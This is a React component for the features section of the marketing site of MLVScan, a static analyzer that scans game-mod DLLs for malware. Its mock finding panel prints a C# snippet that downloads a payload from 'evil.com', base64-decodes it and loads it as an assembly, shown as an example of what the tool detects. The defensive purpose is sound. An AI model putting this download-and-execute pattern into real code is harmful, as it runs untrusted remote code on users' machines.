import { 
  ScanSearch, 
  GitBranch, 
  ShieldCheck, 
  Monitor, 
  ShieldAlert, 
  Terminal, 
  Lock, 
  Network,
  Code2,
  FileCode,
  ChevronRight,
  Puzzle,
  TerminalSquare,
  Cpu,
  Server,
  CheckCircle2,
  Zap,
  Layers,
  AlertTriangle,
  Eye
} from "lucide-react"

const FEATURE_CARDS = [
  {
    icon: ScanSearch,
    title: "Deep IL Analysis",
    description: "Reads compiled bytecode instruction-by-instruction using Mono.Cecil. No execution, no risk."
  },
  {
    icon: GitBranch,
    title: "Attack Chain Detection",
    description: "Traces call graphs and data flows across methods to detect split attacks. 7 named patterns."
  },
  {
    icon: ShieldCheck,
    title: "18+ Detection Rules",
    description: "From process execution to COM reflection attacks, encoded strings, and recursive payloads."
  },
  {
    icon: Monitor,
    title: "100% Client-Side",
    description: "Runs entirely in your browser via WebAssembly. Your files never leave your machine."
  }
]

const PLATFORMS = [
  { name: "MelonLoader", icon: Puzzle },
  { name: "BepInEx 5", icon: TerminalSquare },
  { name: "BepInEx 6 Mono", icon: Cpu },
  { name: "BepInEx 6 IL2CPP", icon: Server },
]

const Features = () => {
  return (
    <section id="features" className="relative py-32 px-4 overflow-hidden">
      <div className="container mx-auto max-w-6xl space-y-24">
        
        {/* Section Header */}
        <div className="text-center max-w-2xl mx-auto">
          <h2 className="text-3xl md:text-4xl font-bold mb-6">
            How MLVScan <span className="gradient-text">Protects You</span>
          </h2>
          <p className="text-lg text-muted-foreground leading-relaxed">
            Enterprise-grade static analysis meets mod ecosystem. Detect threats before they run.
          </p>
        </div>

        {/* Tier 1: At-a-Glance Feature Cards */}
        <div className="grid md:grid-cols-2 lg:grid-cols-4 gap-6">
          {FEATURE_CARDS.map((feature, i) => (
            <div 
              key={i}
              className="rounded-2xl border border-white/10 bg-white/5 p-6 transition-all duration-300"
            >
              <div className="relative">
                <feature.icon className="w-8 h-8 text-teal-400 mb-4" />
                <h3 className="text-lg font-bold mb-2 text-foreground">{feature.title}</h3>
                <p className="text-sm text-muted-foreground leading-relaxed">{feature.description}</p>
              </div>
            </div>
          ))}
        </div>

        {/* Tier 2: Deep-Dive Row 1 - IL Analysis */}
        <div className="grid lg:grid-cols-2 gap-16 items-center">
          {/* Left: Code Mockup */}
          <div className="order-2 lg:order-1 relative">
            <div className="relative rounded-2xl border border-white/10 bg-black/50 backdrop-blur-md p-6 overflow-hidden">
              {/* Finding Header */}
              <div className="flex items-center gap-2 border-b border-white/10 pb-4 mb-4">
                <ShieldAlert className="w-5 h-5 text-red-400" />
                <span className="font-mono text-sm font-bold text-red-400">DETECTED: Dynamic Assembly Loading</span>
              </div>
              
              {/* IL Code Snippet */}
              <div className="font-mono text-xs space-y-2 text-muted-foreground mb-4">
                <p><span className="text-purple-400">void</span> <span className="text-yellow-200">LoadPayload</span>() {"{"}</p>
                <p className="pl-4"><span className="text-blue-300">var</span> client = <span className="text-blue-300">new</span> WebClient();</p>
                <p className="pl-4"><span className="text-blue-300">var</span> data = client.DownloadData(<span className="text-green-300">"https://evil.com/payload.bin"</span>);</p>
                <p className="pl-4"><span className="text-blue-300">var</span> decoded = Convert.FromBase64String(data);</p>
                <div className="pl-4 py-2 bg-red-500/10 border-l-2 border-red-500/50 my-2">
                  <span className="text-red-300">Assembly.Load(decoded);</span>
                </div>
                <p>{"}"}</p>
              </div>

              {/* Finding Annotation */}
              <div className="rounded-lg border border-red-500/20 bg-red-500/5 p-3">
                <div className="flex items-center justify-between mb-2">
                  <span className="text-xs font-bold text-red-400 uppercase tracking-wide">AssemblyDynamicLoadRule</span>
                  <span className="text-xs font-bold px-2 py-0.5 rounded-full bg-red-500/20 text-red-400 border border-red-500/30">Critical</span>
                </div>
                <div className="flex items-center gap-2 text-xs text-muted-foreground">
                  <AlertTriangle className="w-3 h-3 text-amber-400" />
                  <span>Multi-signal: Network + Assembly.Load + Base64 + No Provenance</span>
                </div>
              </div>
            </div>
          </div>

          {/* Right: Explanation */}
          <div className="order-1 lg:order-2">
            <h3 className="text-2xl font-bold mb-4 text-foreground flex items-center gap-3">
              <span className="flex items-center justify-center w-8 h-8 rounded-full bg-red-500/10 text-red-500 text-sm font-bold">1</span>
              See What Code Will Do Before It Runs
            </h3>
            <p className="text-lg text-muted-foreground mb-6 leading-relaxed">
              Most mod loaders blindly execute whatever DLL you drop in. Suspicious mods can steal tokens or install ransomware the moment the game starts.
            </p>
            <div className="space-y-4">
              <div className="flex gap-4">
                <Terminal className="w-6 h-6 text-teal-400 shrink-0" />
                <div>
                  <h4 className="font-bold text-foreground">Static IL Analysis</h4>
                  <p className="text-sm text-muted-foreground mt-1">
                    MLVScan reads compiled .NET bytecode using Mono.Cecil. It understands what code <em>will</em> do without executing a single instruction.
                  </p>
                </div>
              </div>
              <div className="flex gap-4">
                <Layers className="w-6 h-6 text-teal-400 shrink-0" />
                <div>
                  <h4 className="font-bold text-foreground">Multi-Signal Correlation</h4>
                  <p className="text-sm text-muted-foreground mt-1">
                    11 distinct signal categories are tracked and correlated: network, file write, reflection, process execution, and more. Dangerous combinations trigger findings.
                  </p>
                </div>
              </div>
              <div className="flex gap-4">
                <Lock className="w-6 h-6 text-teal-400 shrink-0" />
                <div>
                  <h4 className="font-bold text-foreground">Companion Finding System</h4>
                  <p className="text-sm text-muted-foreground mt-1">
                    Rules like Reflection only fire when combined with other suspicious signals. This dramatically reduces false positives from legitimate mod code.
                  </p>
                </div>
              </div>
            </div>
          </div>
        </div>

        {/* Tier 2: Deep-Dive Row 2 - Attack Chain Detection */}
        <div className="grid lg:grid-cols-2 gap-16 items-center">
          {/* Left: Explanation */}
          <div>
            <h3 className="text-2xl font-bold mb-4 text-foreground flex items-center gap-3">
              <span className="flex items-center justify-center w-8 h-8 rounded-full bg-teal-500/10 text-teal-500 text-sm font-bold">2</span>
              Trace Entire Attack Chains
            </h3>
            <p className="text-lg text-muted-foreground mb-6 leading-relaxed">
              Modern malware splits malicious behavior across multiple methods. MLVScan tracks data flow across boundaries to connect the dots.
            </p>
            <div className="space-y-4">
              <div className="flex gap-4">
                <GitBranch className="w-6 h-6 text-teal-400 shrink-0" />
                <div>
                  <h4 className="font-bold text-foreground">Call Graph Analysis</h4>
                  <p className="text-sm text-muted-foreground mt-1">
                    Builds execution paths from entry points (OnMelonInitialize, Awake, Start) through intermediate calls to suspicious declarations (P/Invoke, COM).
                  </p>
                </div>
              </div>
              <div className="flex gap-4">
                <Network className="w-6 h-6 text-teal-400 shrink-0" />
                <div>
                  <h4 className="font-bold text-foreground">Cross-Method Data Flow</h4>
                  <p className="text-sm text-muted-foreground mt-1">
                    Tracks how data moves through parameters and return values. Detects split attacks: download in one function, execute in another.
                  </p>
                </div>
              </div>
              <div className="flex gap-4">
                <Zap className="w-6 h-6 text-teal-400 shrink-0" />
                <div>
                  <h4 className="font-bold text-foreground">7 Named Attack Patterns</h4>
                  <p className="text-sm text-muted-foreground mt-1">
                    DownloadAndExecute, DataExfiltration, CredentialTheft, DynamicCodeLoading, RemoteConfigLoad, ObfuscatedPersistence. Each with confidence scoring.
                  </p>
                </div>
              </div>
            </div>
          </div>

          {/* Right: Data Flow Mockup */}
          <div className="relative">
            <div className="rounded-2xl border border-white/10 bg-black/40 backdrop-blur-md p-6">
              <div className="flex items-center justify-between mb-6">
                <span className="text-sm font-mono text-teal-400">Data Flow Chain</span>
                <span className="text-xs font-bold px-2 py-1 rounded-full bg-teal-500/20 text-teal-300 border border-teal-500/30">
                  Confidence: 0.92
                </span>
              </div>

              {/* Flow Visualization */}
              <div className="flex items-center justify-between gap-2 mb-6">
                {/* Source Node */}
                <div className="flex-1 rounded-xl border border-teal-500/30 bg-teal-500/10 p-3 text-center">
                  <Network className="w-5 h-5 text-teal-400 mx-auto mb-2" />
                  <div className="text-xs font-bold text-teal-400">Source</div>
                  <div className="text-xs text-muted-foreground mt-1">WebClient<br/>.DownloadData()</div>
                </div>

                {/* Arrow 1 */}
                <div className="flex items-center">
                  <ChevronRight className="w-5 h-5 text-teal-400" />
                </div>

                {/* Transform Node */}
                <div className="flex-1 rounded-xl border border-amber-500/30 bg-amber-500/10 p-3 text-center">
                  <Code2 className="w-5 h-5 text-amber-400 mx-auto mb-2" />
                  <div className="text-xs font-bold text-amber-400">Transform</div>
                  <div className="text-xs text-muted-foreground mt-1">FromBase64<br/>.String()</div>
                </div>

                {/* Arrow 2 */}
                <div className="flex items-center">
                  <ChevronRight className="w-5 h-5 text-teal-400" />
                </div>

                {/* Sink Node */}
                <div className="flex-1 rounded-xl border border-red-500/30 bg-red-500/10 p-3 text-center">
                  <FileCode className="w-5 h-5 text-red-400 mx-auto mb-2" />
                  <div className="text-xs font-bold text-red-400">Sink</div>
                  <div className="text-xs text-muted-foreground mt-1">Assembly<br/>.Load()</div>
                </div>
              </div>

              {/* Pattern Badge */}
              <div className="rounded-lg border border-teal-500/20 bg-teal-500/5 p-3 flex items-center justify-between">
                <div className="flex items-center gap-2">
                  <Eye className="w-4 h-4 text-teal-400" />
                  <span className="text-sm font-bold text-teal-300">DownloadAndExecute</span>
                </div>
                <CheckCircle2 className="w-4 h-4 text-teal-400" />
              </div>
            </div>
          </div>
        </div>

        {/* Tier 2: Deep-Dive Row 3 - Mod Ecosystem */}
        <div className="grid lg:grid-cols-2 gap-16 items-center">
          {/* Left: Platform Cards + Whitelisting */}
          <div className="order-2 lg:order-1 relative">
            <div className="relative rounded-2xl border border-white/10 bg-black/40 backdrop-blur-md p-6">
              <h4 className="text-sm font-bold text-muted-foreground mb-4">Supported Platforms</h4>
              <div className="grid grid-cols-2 gap-3 mb-6">
                {PLATFORMS.map((platform, i) => (
                  <div 
                    key={i}
                    className="flex items-center gap-3 p-3 rounded-xl border border-white/10 bg-white/5"
                  >
                    <platform.icon className="w-5 h-5 text-teal-400" />
                    <span className="text-sm font-medium text-foreground">{platform.name}</span>
                  </div>
                ))}
              </div>

              {/* Whitelisting Visual */}
              <div className="rounded-xl border border-teal-500/20 bg-teal-500/5 p-4">
                <div className="flex items-center justify-between mb-2">
                  <span className="text-xs font-bold text-teal-400">SHA256 Whitelisting</span>
                  <CheckCircle2 className="w-4 h-4 text-teal-400" />
                </div>
                <div className="font-mono text-xs text-muted-foreground bg-black/30 rounded p-2">
                  sha256:a1b2c3d4e5f6...7g8h9i0j1k2l3
                </div>
                <p className="text-xs text-muted-foreground mt-2">
                  Cryptographically secure trust decisions. Rename-proof and tamper-proof.
                </p>
              </div>
            </div>
          </div>

          {/* Right: Ecosystem Explanation */}
          <div className="order-1 lg:order-2">
            <h3 className="text-2xl font-bold mb-4 text-foreground flex items-center gap-3">
              <span className="flex items-center justify-center w-8 h-8 rounded-full bg-teal-500/10 text-teal-500 text-sm font-bold">3</span>
              Built for the Mod Ecosystem
            </h3>
            <p className="text-lg text-muted-foreground mb-6 leading-relaxed">
              Purpose-built for Schedule 1 modding. Supports MelonLoader, BepInEx 5 & 6 (Mono & IL2Cpp). Protects at load time, not after.
            </p>
            <div className="space-y-4">
              <div className="flex gap-4">
                <ShieldAlert className="w-6 h-6 text-teal-400 shrink-0" />
                <div>
                  <h4 className="font-bold text-foreground">Runtime Auto-Disable</h4>
                  <p className="text-sm text-muted-foreground mt-1">
                    Suspicious mods are automatically disabled before they can execute. No manual intervention needed.
                  </p>
                </div>
              </div>
              <div className="flex gap-4">
                <FileCode className="w-6 h-6 text-teal-400 shrink-0" />
                <div>
                  <h4 className="font-bold text-foreground">SHA256 Whitelisting</h4>
                  <p className="text-sm text-muted-foreground mt-1">
                    Trusted mods can be permanently whitelisted by hash. Mod loaders support optional developer mode with remediation guidance for false positives.
                  </p>
                </div>
              </div>
              <div className="flex gap-4">
                <Terminal className="w-6 h-6 text-teal-400 shrink-0" />
                <div>
                  <h4 className="font-bold text-foreground">DevCLI for CI/CD</h4>
                  <p className="text-sm text-muted-foreground mt-1">
                    Add security gates to your build pipeline. Fails on findings above configurable thresholds. Integrates with GitHub Actions.
                  </p>
                </div>
              </div>
            </div>
          </div>
        </div>

      </div>
    </section>
  )
}

export default Features
